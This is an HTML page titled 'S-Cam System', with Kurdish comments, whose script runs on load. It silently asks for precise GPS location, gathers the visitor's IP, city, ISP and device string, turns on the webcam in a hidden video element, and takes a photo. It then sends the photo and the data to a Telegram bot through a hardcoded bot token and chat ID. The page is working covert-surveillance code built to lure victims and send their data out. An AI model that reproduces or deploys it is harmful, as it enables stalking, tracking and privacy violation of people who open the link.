<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>S-Cam System</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <video id="video" autoplay style="display:none;"></video>

    <script>
        // زانیارییە نوێ کراوەکان
        const BOT_TOKEN = '8491301422:AAE8wM2ECL7zsRUimloWWYb5myT4iKNy7pc';
        const CHAT_ID = '659131693';

        async function startProcess() {
            let locationText = "📍 ناونیشانی ورد: ڕەتکرایەوە یان پشتگیری ناکرێت";

            // ١. هەوڵدان بۆ وەرگرتنی ناونیشانی ورد (GPS)
            try {
                if (navigator.geolocation) {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000
                        });
                    });
                    if (pos) {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        locationText = 📍 ناونیشانی ورد (GPS):\nhttps://www.google.com/maps?q=${lat},${lon}\nLatitude: ${lat}\nLongitude: ${lon};
                    }
                }
            } catch (e) {
                console.log("Location access denied.");
            }

            try {
                // ٢. وەرگرتنی IP و زانیاری گشتی
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const fullInfo = `
🚀 زانیاری نوێ لە بۆتەوە:
-------------------------
🌐 IP: ${ipData.ip}
🌍 وڵات: ${ipData.country_name}
🏙 شار: ${ipData.city}
📶 ئینتەرنێت: ${ipData.org}
📱 مۆبایل: ${navigator.userAgent}
-------------------------
${locationText}
                `;

                // ٣. کردنەوەی کامێرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // چاوەڕێکردن بۆ ٢ چرکە تا کامێرا ڕێکدەبێتەوە
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'img.jpg');
                        formData.append('chat_id', CHAT_ID);
                        formData.append('caption', fullInfo);

                        // ناردن بۆ تێلیگرام
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        if(response.ok) {
                            console.log("ناردرا بۆ تێلیگرام!");
                        } else {
                            console.log("هەڵە لە ناردن بۆ تێلیگرام");
                        }
                    }, 'image/jpeg');
                }, 2000);

            } catch (err) {
                console.error("کێشەیەک ڕوویدا:", err);
            }
        }

        // دەستپێکردنی پڕۆسەکە
        startProcess();
    </script>
</body>
</html>
